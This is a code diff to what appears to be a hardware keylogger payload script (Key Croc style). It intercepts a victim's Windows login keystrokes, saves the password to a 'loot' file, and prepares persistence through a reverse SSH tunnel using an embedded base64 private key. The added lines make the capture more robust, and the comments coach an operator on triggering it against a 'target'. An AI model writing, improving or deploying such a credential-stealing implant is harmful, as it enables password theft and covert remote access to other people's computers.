@@ -30,10 +30,17 @@ TUNNEL_KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFy
 export DUCKY_LANG=se
 
 ####################Trigger & Clean Up#######################################
-# Fires on ENTER — note this can trigger mid-session.
-# For a more targeted trigger, change to a specific key sequence your
-# target habitually types, or restrict to a time window using date checks.
+# IMPORTANT: Only deploy this on a Windows machine at login screen.
+# If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
+# Uncomment one trigger strategy:
+
+# Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)
 MATCH \[ENTER\]
+
+# Strategy 2: Safer — only fires during first 30 seconds after boot (uncomment to use)
+# This gives you time to unplug if you realize it's plugged into the wrong machine
+# MATCH \[ENTER\]
+# if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi
 
 rm -f /root/loot/win-pass*
 
@@ -49,11 +56,26 @@ Q UNLOCK
 WAIT_FOR_KEYBOARD_ACTIVITY 1
 
 #######Intercept login keystrokes############################################
-# NEXT 50 captures up to 50 key events — enough for long passwords with
-# shifted characters, numbers, and symbols. OpenAI parsing handles the extras.
-SAVEKEYS /root/loot/win-pass.txt NEXT 50
-Q DELAY 2000
-while [ ! -f /root/loot/win-pass.txt ]; do sleep 2; done
+# SAVEKEYS records in the background while keystrokes pass through normally.
+# After the first ENTER, it captures the next 50 key events (password + ENTER).
+# You can still type freely and log in normally.
+
+SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
+echo $! > /tmp/savekeys.pid  # Store PID so we can wait for it later
+Q DELAY 100  # Let SAVEKEYS initialize
+
+# Now just wait for the capture to complete before proceeding
+# Poll the file — if it exists, SAVEKEYS succeeded
+for i in {1..30}; do
+    [ -f /root/loot/win-pass.txt ] && break
+    sleep 0.5
+done
+
+# If file still doesn't exist after 15 seconds, bail out gracefully
+if [ ! -f /root/loot/win-pass.txt ]; then
+    echo "[!] SAVEKEYS failed — no keystroke file. Restoring keyboard passthrough."
+    exit 1
+fi
 
 #####################Persistence via Reverse SSH Tunnel######################
 # OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
